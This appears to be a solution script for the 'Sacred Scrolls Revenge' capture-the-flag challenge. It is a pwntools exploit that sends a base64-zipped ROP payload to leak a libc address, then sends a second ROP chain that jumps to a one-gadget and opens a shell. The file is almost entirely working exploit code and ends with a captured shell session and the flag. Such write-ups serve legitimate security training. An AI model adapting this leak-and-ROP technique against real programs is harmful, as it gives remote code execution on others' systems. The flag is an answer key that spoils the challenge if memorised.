#https://hiumee.com/posts/HTB-University-CTF-Sacred-Scrolls-Revenge/

from pwn import *
from os import system

# Pre-made payload to avoid `/` characters in it
# Payload: the 7 bytes magic number + padding + RBP + POP_RDI + GOT[system] + PLT[puts] + RET + RET + MAIN + padding
# RPB = 0
# RET + RET and final padding is used to change the base64 output to avoid `/`
# 2 RET instructions are used to keep the stack alignment
payload_leak = b"UEsDBBQAAAAIAK1ag1V0l2o0MgAAAGUAAAAJABwAc3BlbGwudHh0VVQJAAMVFYtjFRWLY3V4CwABBOgDAAAE6AMAAPswf+LkR7MWJmIHaVEMULBZ0AFMT9BPgAhwQPjn2FHpR3wQ2rEqNanIwMDEwCDNwBIAUEsBAh4DFAAAAAgArVqDVXSXajQyAAAAZQAAAAkAGAAAAAAAAAAAAP+BAAAAAHNwZWxsLnR4dFVUBQADFRWLY3V4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE8AAAB1AAAAAAA="

libc_system = 0x50d60
win_addr = 0xebcf5
win_diff = libc_system - win_addr
data_section = 0x603000

io = process("./sacred_scrolls")
#ip, port = "139.59.170.23", 32060
#io = remote(ip, port)

io.recvuntil(b"tag: ") # Tag - anything
io.sendline(b"1")

io.recvuntil(b">> ") # Select upload
io.sendline(b"1")

io.recvuntil(b": ") # Send first payload
io.sendline(payload_leak)

io.recvuntil(b">> ") # Read - load payload in memory
io.sendline(b"2")

io.recvuntil(b">> ") # Exit - execute payload
io.sendline(b"3")

io.recvuntil(b"saved!")
io.recvline()
leak = io.recvline().strip()

while len(leak) < 8: # Pad leak with null bytes
	leak = leak + b"\x00"

print(u64(leak))
win_addr = u64(leak) - win_diff


header = b"\xf0\x9f\x91\x93\xe2\x9a\xa1" + b"a"*25
#header = b"a"*32
rop = p64(data_section + 0x78) + p64(win_addr)
payload = header + rop

system("rm spell.zip && rm spell.txt 2>/dev/null")

open("spell.txt", 'wb').write(payload)
command = f"zip spell.zip spell.txt && cat spell.zip | base64 > payload"
system(command)

payload = open("payload").read().replace("\n", "")

system("rm spell.txt payload spell.zip")

if "/" in payload:
	print("Try again. The payload happened to be invalid")
	exit()

io.recvuntil(b"tag: ") # Tag - anything
io.sendline(b"1")

io.recvuntil(b">> ") # Select upload
io.sendline(b"1")

io.recvuntil(b": ") # Send second payload
io.sendline(payload)

io.recvuntil(b">> ") # Read - load payload in memory
io.sendline(b"2")

io.recvuntil(b">> ") # Exit - execute payload
io.sendline(b"3")

io.interactive() # RCE

'''
[-] This spell is not quiet effective, thus it will not be saved!
$ ls
flag.txt
glibc
sacred_scrolls
spell.txt
spell.zip
$ cat flag.txt
HTB{s1gn3ed_sp3ll5_fr0m_th3_b01_wh0_l1v3d}
'''
